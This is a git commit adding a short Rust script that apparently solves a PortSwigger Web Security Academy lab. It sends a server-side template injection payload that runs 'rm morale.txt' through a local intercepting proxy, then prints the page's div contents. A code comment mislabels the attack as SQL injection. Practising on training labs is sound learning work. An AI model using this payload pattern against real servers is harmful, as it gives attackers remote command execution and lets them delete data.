80daa839cbdd4fe7af1be55516d7d6699ebb96ae
Red-Beard1116 <142173753+Red-Beard1116@users.noreply.github.com>
2024-08-12 01:45:33 -0500

    Update main.rs

--- sstibasic/main.rs
+++ sstibasic/main.rs
@@ -1,1 +1,53 @@
+use prettytable::{Cell, Row, Table};
+use reqwest::{self};
+use scraper::{Html, Selector};
+use std::fs::File;
+use std::io::Read;
 
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // Create a reqwest Client
+    let mut buf = Vec::new();
+
+    let _file = File::open("/home/redbeard/Downloads/cacert.der")?
+        .read_to_end(&mut buf)
+        .unwrap();
+
+    let cert = reqwest::Certificate::from_der(&buf).unwrap();
+
+    let client = reqwest::Client::builder()
+        .proxy(reqwest::Proxy::all("http://127.0.0.1:8080").unwrap())
+        .add_root_certificate(cert)
+        .build()
+        .unwrap();
+
+    // URL of the endpoint for the sqli
+    let url = "https://0a61002003ff236c816b759100df004b.web-security-academy.net/?message=%3C%25%3d+system(%22rm+morale.txt%22)+%25%3E";
+
+    // Send the HTTP request and handle the response
+    let response = client.get(url).send().await?;
+
+    // Check if the response was successful (status code 2xx)
+    if !response.status().is_success() {
+        eprintln!("Request failed with status code: {}", response.status());
+        return Err("Request failed".into());
+    }
+
+    // Read the response body as text
+    let _html = response.text().await?;
+    let document = Html::parse_document(&_html);
+    let payout = Selector::parse("div").unwrap();
+
+    let mut table = Table::new();
+    table.add_row(Row::new(vec![Cell::new("DIV")]));
+
+    let dapayout = document.select(&payout).collect::<Vec<_>>();
+    for pay in dapayout.iter() {
+        let dapayout_text = pay.text().collect::<String>();
+
+        table.add_row(Row::new(vec![Cell::new(&dapayout_text)]));
+    }
+
+    table.printstd();
+    Ok(())
+}
